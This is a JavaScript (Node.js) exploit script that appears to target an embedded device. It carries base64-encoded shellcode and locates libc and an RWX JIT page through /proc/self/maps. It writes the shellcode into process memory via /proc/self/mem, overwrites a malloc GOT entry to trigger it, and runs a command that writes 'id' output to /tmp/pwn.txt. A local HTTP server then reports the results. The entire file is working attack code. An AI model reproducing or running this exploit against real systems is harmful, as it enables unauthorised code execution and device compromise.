(function() {
  var fs = require('fs');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe44c.txt';
  var PROBE2 = '/tmp/tbprobe44c.txt';
  var PORT = 8128;
  function w(s) {
    var line = s + '\n';
    try { fs.appendFileSync(PROBE, line); } catch(e) {}
    try { fs.appendFileSync(PROBE2, line); } catch(e) {}
  }
  try { fs.writeFileSync(PROBE, 'step1:alive\n'); } catch(e) {}
  try { fs.writeFileSync(PROBE2, 'step1:alive\n'); } catch(e) {}

  try {
    var http = require('http');
    var cp   = require('child_process');
    w('step2:requires_ok');

    // Shellcode_v3 496 bytes as base64 — avoids large array literal in V8 4.5
    var SC_B64 =
      'LenwT0/wAgcA3wAoPNAcTBxND/K0EE/wAgFP8AACT/AFBwDfBkYwRilGT/AAAk/wEw' +
      'cA34GwAJQwRmlGT/AEAk/wBAcA3wGwMEZP8AYHAN9P8AAAT/AgAU/wAwJP8CIDb/AA' +
      'BE/wAAUwtE/wwAcA3wKwvejwjwC/r/MAgK/zAIAAAAAAAAAAAA/yLBBP8AABT/AAAk' +
      '/wBQcA34BGT/AAAEzy5HHA8gABT/ABAk/wAgNERk/wAAUwtE/wwAcA3wKwgUZARk/w' +
      'BgcA3z+gT/ACAU/wAAJP8AUHAN+CRk/wAABP8AABwPIBAU/wAwJP8CIDb/AABE/wAA' +
      'UwtE/wwAcA3wKwg0ZP8AAEwPIBBFxEQfYAcMDyBQAhRk/wAAJP8AADT/AABSC0T/B4' +
      'BwDfAbAAKBTRSvIgFsDyBwZIRkzy5HHA8gABT/AEAk/w3AcA3wE+89FP8AAAT/ABBw' +
      'DfSvIgFsDyBwZH9ktlTURQRilGT/AAAk/wEwcA31BGHKFP8AECT/AEBwDfAT7v0U/w' +
      'AAQQtA/yRgQQtA/yPwQQtAakELQFoGlGT/AAAk/wCwcA30/wAgBP8AEHAN8vYmluL3' +
      'dhc3V0aWxpdHkAL3Byb2Mvc2VsZi9tZW0ALWUAaWQgPiAvdG1wL3B3bi50eHQA4AAAvw==';
    var SC_BIN = new Buffer(SC_B64, 'base64');
    w('step3:sc_decoded len=' + SC_BIN.length);

    var maps = fs.readFileSync('/proc/self/maps', 'utf8');
    w('step4:maps_ok lines=' + maps.split('\n').length);

    var libcBase = 0, jitPage = 0, jitSz = 0;
    maps.split('\n').forEach(function(line) {
      if (!libcBase && line.indexOf('libc-2.24.so') !== -1) {
        var m = line.match(/^([0-9a-f]+)-/); if (m) libcBase = parseInt(m[1], 16);
      }
      var rwx = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
      if (rwx) { var sz = parseInt(rwx[2],16)-parseInt(rwx[1],16); if (sz>jitSz){jitSz=sz;jitPage=parseInt(rwx[1],16);} }
    });
    var GOT_OFFSET = 0x143014;
    var gotAddr = libcBase + GOT_OFFSET;
    w('step5:libc=0x'+libcBase.toString(16)+' jit=0x'+jitPage.toString(16)+' got=0x'+gotAddr.toString(16));

    if (!libcBase || !jitPage) {
      w('FAIL:no_addrs');
      var b0 = fs.readFileSync(PROBE,'utf8');
      http.createServer(function(r,s){s.end(b0);}).listen(PORT,'127.0.0.1').on('error',function(){});
      setInterval(function(){},60000); return;
    }

    var memfd = fs.openSync('/proc/self/mem', 'r+');
    w('step6:mem_fd=' + memfd);

    var ob = new Buffer(4);
    fs.readSync(memfd, ob, 0, 4, gotAddr);
    var origMalloc = ob.readUInt32LE(0);
    w('step7:origMalloc=0x'+origMalloc.toString(16));

    SC_BIN[0x80]=(origMalloc>>>0)&0xff;  SC_BIN[0x81]=(origMalloc>>>8)&0xff;
    SC_BIN[0x82]=(origMalloc>>>16)&0xff; SC_BIN[0x83]=(origMalloc>>>24)&0xff;
    SC_BIN[0x84]=(gotAddr>>>0)&0xff;     SC_BIN[0x85]=(gotAddr>>>8)&0xff;
    SC_BIN[0x86]=(gotAddr>>>16)&0xff;    SC_BIN[0x87]=(gotAddr>>>24)&0xff;
    w('step8:sc_patched');

    fs.writeSync(memfd, SC_BIN, 0, SC_BIN.length, jitPage);
    w('step9:sc_written_to_jit');

    var gBuf = new Buffer(4);
    gBuf.writeUInt32LE((jitPage+1)>>>0, 0);
    fs.writeSync(memfd, gBuf, 0, 4, gotAddr);
    fs.closeSync(memfd);
    w('step10:got_overwritten target=0x'+((jitPage+1)>>>0).toString(16));

    w('step11:firing malloc trigger');
    var _t = new Buffer(16);
    w('step12:trigger_returned — shellcode ran and forked');

    setTimeout(function() {
      try {
        var m2=fs.openSync('/proc/self/mem','r+');
        var r2=new Buffer(4); fs.readSync(m2,r2,0,4,gotAddr);
        w('step13:got_after=0x'+(r2.readUInt32LE(0)>>>0).toString(16));
        fs.closeSync(m2);
      } catch(e) { w('step13:got_read_fail:'+e.message); }

      cp.exec('/bin/wasutility -e "id > /tmp/pwn.txt"', {timeout:8000}, function(e) {
        var pwn='not_found';
        try { pwn=fs.readFileSync('/tmp/pwn.txt','utf8').trim(); } catch(re) {}
        w('step14:exec_e='+(e?e.code:'ok')+' pwn='+pwn);
        var final = fs.readFileSync(PROBE,'utf8') + '=== END ===\n';
        fs.writeFileSync(PROBE, final);
        http.createServer(function(req,res){res.end(final);}).listen(PORT,'127.0.0.1').on('error',function(){});
        setInterval(function(){},60000);
      });
    }, 35000);

  } catch(err) {
    w('UNCAUGHT:' + err.message + ' stack=' + (err.stack||'').substring(0,300));
    var body = '';
    try { body = fs.readFileSync(PROBE,'utf8'); } catch(e) {}
    var http2 = require('http');
    http2.createServer(function(r,s){s.end(body);}).listen(PORT,'127.0.0.1').on('error',function(){});
    setInterval(function(){},60000);
  }
})();
